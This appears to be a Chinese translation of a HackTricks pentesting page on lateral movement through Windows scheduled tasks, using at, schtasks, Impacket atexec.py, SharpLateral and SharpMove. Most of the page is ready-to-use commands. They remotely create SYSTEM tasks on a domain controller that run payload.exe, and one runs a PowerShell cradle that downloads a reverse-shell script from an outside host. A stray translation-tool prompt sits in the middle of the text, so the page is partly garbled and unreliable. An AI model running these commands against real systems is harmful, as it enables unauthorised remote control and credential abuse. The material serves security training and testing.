# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## 工作原理

拥有 Windows 主机的 administrative access 后，操作者可以远程创建并启动 scheduled task。`/S` 选项用于选择远程主机，`/U` 和 `/P` 用于在需要时提供创建任务所需的凭据，而 `/RU` 用于选择任务运行时使用的账户。`/TR` 引用的命令必须存在于远程系统上。<sup>[[1]](#references)</sup>

较旧的 `at` 命令也可以在远程主机上安排命令执行，前提是 Schedule service 正在运行。它会在服务账户下执行 scheduled jobs，该账户通常是 `SYSTEM`：<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
创建任务，然后启动它：
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
请提供需要翻译的英文 Markdown 内容。
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
对于定期每周执行的任务，请使用有效的每周计划，并明确指定日期：
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
任务操作也可以直接调用 PowerShell。以下实验示例会下载并运行一个 script；请仅将 payload 托管在获准用于该评估的基础设施上：
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket 的 `atexec.py` 通过 Task Scheduler 服务自动执行远程命令，并支持使用密码、NTLM-hash 或 Kerberos 进行身份验证。<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral 提供了一种 scheduled-task 执行方法：<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove 提供了另一种 Task Scheduler 实现：<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
有关[**在此处使用 schtasks 和 silver tickets**](../active-directory-methodology/silver-ticket.md#host)的更多信息。

使用后删除测试任务：
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` 命令](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
